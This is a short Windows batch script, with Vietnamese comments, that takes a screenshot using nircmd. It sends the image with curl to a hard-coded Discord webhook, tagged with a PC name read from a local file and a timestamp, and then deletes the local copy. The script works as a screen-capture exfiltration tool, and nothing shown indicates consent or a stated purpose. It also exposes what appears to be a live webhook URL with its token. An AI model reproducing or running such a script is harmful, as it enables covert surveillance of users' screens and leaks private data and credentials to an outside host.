@echo off
setlocal enableextensions enabledelayedexpansion

cd %USERPROFILE%\Desktop\dow-code\test-something\asset

set "filePath=%USERPROFILE%\Desktop\dow-code\Buoc3-Dat-ten-PC.txt"

set "firstLine="
for /f "usebackq delims=" %%a in ("%filePath%") do (
    set "firstLine=%%a"
    goto :break
)
:break

set "rawDate=%date%"
for /f "tokens=2-4 delims= " %%a in ("%rawDate%") do (
    set "month=%%a"
    set "day=%%b"
    set "year=%%c"
)

for /f "tokens=1-3 delims=:" %%a in ("%time%") do (
    set "hour=%%a"
    set "minute=%%b"
    set "second=%%c"
)
set "timestamp=%hour%h_%day%_%month%_%year%"

:: URL webhook Discord của bạn
set WEBHOOK_URL=https://discord.com/api/webhooks/1402019320959340705/T5gQpE_5S5ad6f2VXj3I_XwfvT5iK33Fq6tvKkt-Sf4qshjgOwkoIicZ2U8QGzFn_w0W
set SCREENSHOT_PATH=%~dp0screenshot.png

:: Chụp màn hình bằng NirCmd và lưu với tên screenshot.png
nircmd.exe savescreenshot "%SCREENSHOT_PATH%"

:: Gửi ảnh lên webhook bằng curl
curl -X POST "%WEBHOOK_URL%" -H "Content-Type: multipart/form-data" ^
    -F "file=@%SCREENSHOT_PATH%" -F "payload_json={\"content\":\"%firstLine% - %timestamp%\"}"

:: Xóa ảnh sau khi gửi
del "%SCREENSHOT_PATH%"

echo Đã gửi ảnh lên Discord thành công!
exit